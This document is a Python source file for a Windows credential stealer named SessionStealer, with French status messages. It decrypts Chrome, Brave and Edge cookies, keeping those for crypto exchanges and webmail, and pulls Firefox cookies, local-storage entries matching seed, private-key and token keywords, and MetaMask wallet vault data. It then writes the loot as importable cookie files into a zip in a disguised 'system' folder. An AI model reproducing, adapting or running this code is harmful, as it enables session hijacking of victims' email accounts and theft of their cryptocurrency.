import os
import sys
import json
import sqlite3
import shutil
import base64
import zipfile
import tempfile
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import win32crypt

class SessionStealer:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.results = {
            "cookies": [],
            "local_storage": [],
            "metamask": []
        }
        
    def get_encryption_key(self, browser_path):
        """Get AES key for Chrome-based browsers on Windows"""
        try:
            local_state = os.path.join(browser_path, "Local State")
            with open(local_state, 'r', encoding='utf-8') as f:
                local_state_data = json.load(f)
            
            encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except:
            return None
    
    def decrypt_chrome_value(self, encrypted_value, key):
        """Decrypt Chrome encrypted values"""
        try:
            if encrypted_value[:3] == b'v10':
                iv = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(ciphertext).decode()
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except:
            try:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            except:
                return ""
    
    def get_browser_paths(self):
        """Retourne les chemins des navigateurs Windows"""
        return {
            "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data"
        }
    
    def extract_chrome_cookies(self, browser_path, browser_name):
        """Extract cookies from Chrome-based browsers on Windows"""
        cookie_paths = [
            os.path.join(browser_path, "Default", "Network", "Cookies"),
            os.path.join(browser_path, "Default", "Cookies"),
            os.path.join(browser_path, "Profile 1", "Network", "Cookies"),
            os.path.join(browser_path, "Profile 1", "Cookies")
        ]
        
        for cookie_db in cookie_paths:
            if os.path.exists(cookie_db):
                try:
                    temp_db = os.path.join(self.temp_dir, f"{browser_name}_cookies.db")
                    shutil.copy2(cookie_db, temp_db)
                    
                    key = self.get_encryption_key(browser_path)
                    
                    conn = sqlite3.connect(temp_db)
                    conn.text_factory = bytes
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT host_key, name, encrypted_value, expires_utc 
                        FROM cookies 
                        WHERE host_key LIKE '%binance%' 
                           OR host_key LIKE '%coinbase%' 
                           OR host_key LIKE '%metamask%'
                           OR host_key LIKE '%exchange%'
                           OR host_key LIKE '%crypto%'
                           OR host_key LIKE '%gmail%'
                           OR host_key LIKE '%outlook%'
                           OR host_key LIKE '%live%'
                           OR host_key LIKE '%hotmail%'
                           OR host_key LIKE '%yahoo%'
                           OR host_key LIKE '%protonmail%'
                    """)
                    
                    for host, name, encrypted_value, expires in cursor.fetchall():
                        try:
                            host = host.decode('utf-8')
                            name = name.decode('utf-8')
                            
                            if encrypted_value[:3] == b'v10':
                                decrypted = self.decrypt_chrome_value(encrypted_value, key)
                            else:
                                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                            
                            if decrypted:
                                self.results["cookies"].append({
                                    "browser": browser_name,
                                    "domain": host,
                                    "name": name,
                                    "value": decrypted,
                                    "expires": expires
                                })
                        except:
                            continue
                    
                    conn.close()
                except Exception as e:
                    pass
    
    def extract_chrome_local_storage(self, browser_path, browser_name):
        """Extract Local Storage data on Windows"""
        storage_path = os.path.join(browser_path, "Default", "Local Storage", "leveldb")
        if not os.path.exists(storage_path):
            storage_path = os.path.join(browser_path, "Profile 1", "Local Storage", "leveldb")
        
        if os.path.exists(storage_path):
            for file in os.listdir(storage_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(storage_path, file)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            keywords = [b'metamask', b'privatekey', b'wallet', b'seed', b'phrase', 
                                      b'gmail', b'outlook', b'token', b'session', b'credentials']
                            if any(keyword in content.lower() for keyword in keywords):
                                self.results["local_storage"].append({
                                    "browser": browser_name,
                                    "file": file,
                                    "data": content[:500].hex()
                                })
                    except:
                        pass
    
    def extract_metamask(self):
        """Extract MetaMask wallets on Windows"""
        paths = [
            os.path.expanduser("~") + r"\AppData\Roaming\MetaMask",
            os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
            os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
            os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"
        ]
        
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.json') or file.endswith('.ldb'):
                            file_path = os.path.join(root, file)
                            try:
                                if file.endswith('.json'):
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        data = json.load(f)
                                        if 'data' in data or 'vault' in data or 'wallet' in str(data).lower():
                                            self.results["metamask"].append({
                                                "source": path,
                                                "file": file,
                                                "data": str(data)[:1000]
                                            })
                            except:
                                pass
    
    def extract_firefox_data(self):
        """Extract Firefox cookies and storage on Windows"""
        firefox_profiles = os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        
        if os.path.exists(firefox_profiles):
            for profile in os.listdir(firefox_profiles):
                if '.default' in profile or '.default-release' in profile:
                    profile_path = os.path.join(firefox_profiles, profile)
                    
                    cookies_db = os.path.join(profile_path, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        try:
                            temp_db = os.path.join(self.temp_dir, "firefox_cookies.db")
                            shutil.copy2(cookies_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("""
                                SELECT host, name, value FROM moz_cookies
                                WHERE host LIKE '%binance%' 
                                   OR host LIKE '%coinbase%' 
                                   OR host LIKE '%metamask%'
                                   OR host LIKE '%gmail%'
                                   OR host LIKE '%outlook%'
                                   OR host LIKE '%live%'
                            """)
                            
                            for host, name, value in cursor.fetchall():
                                self.results["cookies"].append({
                                    "browser": "Firefox",
                                    "domain": host,
                                    "name": name,
                                    "value": value
                                })
                            conn.close()
                        except:
                            pass
                    
                    storage_path = os.path.join(profile_path, "storage", "default")
                    if os.path.exists(storage_path):
                        for root, dirs, files in os.walk(storage_path):
                            for file in files:
                                if file.endswith('.sqlite'):
                                    try:
                                        db_path = os.path.join(root, file)
                                        conn = sqlite3.connect(db_path)
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                        for table in cursor.fetchall():
                                            try:
                                                cursor.execute(f"SELECT * FROM {table[0]} LIMIT 5")
                                                rows = cursor.fetchall()
                                                if rows and any('wallet' in str(row).lower() or 'token' in str(row).lower() for row in rows):
                                                    self.results["local_storage"].append({
                                                        "browser": "Firefox",
                                                        "domain": os.path.basename(root),
                                                        "data": str(rows)
                                                    })
                                            except:
                                                pass
                                        conn.close()
                                    except:
                                        pass
    
    def create_har_file(self):
        """Create HAR file for easy cookie import"""
        har_entries = []
        
        for cookie in self.results["cookies"]:
            har_entries.append({
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": cookie["domain"],
                "path": "/",
                "expires": datetime.now() + timedelta(days=30),
                "httpOnly": False,
                "secure": True,
                "session": False
            })
        
        har_data = {
            "log": {
                "entries": [{
                    "request": {
                        "cookies": har_entries
                    }
                }]
            }
        }
        
        return har_data
    
    def save_results(self):
        """Save all extracted data on Windows"""
        output_dir = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'system')
        
        # Créer un dossier temporaire pour les fichiers individuels
        temp_output_dir = os.path.join(self.temp_dir, 'output')
        os.makedirs(temp_output_dir, exist_ok=True)
        
        with open(os.path.join(temp_output_dir, 'session_data.json'), 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2)
        
        with open(os.path.join(temp_output_dir, 'cookies.txt'), 'w', encoding='utf-8') as f:
            for cookie in self.results["cookies"]:
                f.write(f"{cookie['domain']}\tTRUE\t/\tFALSE\t2597573456\t{cookie['name']}\t{cookie['value']}\n")
        
        har_data = self.create_har_file()
        with open(os.path.join(temp_output_dir, 'cookies.har'), 'w', encoding='utf-8') as f:
            json.dump(har_data, f, indent=2)
        
        zip_path = os.path.join(output_dir, 'settings_results.zip')
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in os.listdir(temp_output_dir):
                zipf.write(os.path.join(temp_output_dir, file), file)
        
        return zip_path
    
    def run(self):
        """Main execution for Windows"""
        print("[+] Début de l'extraction des données...")
        
        browsers = self.get_browser_paths()
        
        for name, path in browsers.items():
            if os.path.exists(path):
                print(f"[+] Extraction depuis {name}")
                self.extract_chrome_cookies(path, name)
                self.extract_chrome_local_storage(path, name)
        
        print("[+] Extraction depuis Firefox")
        self.extract_firefox_data()
        
        print("[+] Recherche des portefeuilles MetaMask")
        self.extract_metamask()
        
        output_file = self.save_results()
        
        print(f"\n[+] Extraction terminée!")
        print(f"[+] Cookies trouvés: {len(self.results['cookies'])}")
        print(f"[+] Éléments Local Storage: {len(self.results['local_storage'])}")
        print(f"[+] Données MetaMask trouvées: {len(self.results['metamask'])}")
        print(f"[+] Données sauvegardées dans: {output_file}")
        
        print("\n[+] Cookies de session importants trouvés:")
        for cookie in self.results["cookies"][:10]:
            if any(domain in cookie['domain'] for domain in ['binance', 'coinbase', 'gmail', 'outlook']):
                print(f"  {cookie['domain']} - {cookie['name']}: {cookie['value'][:30]}...")
        
        return self.results

if __name__ == "__main__":
    try:
        stealer = SessionStealer()
        data = stealer.run()
    except Exception as e:
        print(f"[-] Erreur: {e}")
    
    input("\nAppuyez sur Entrée pour quitter...")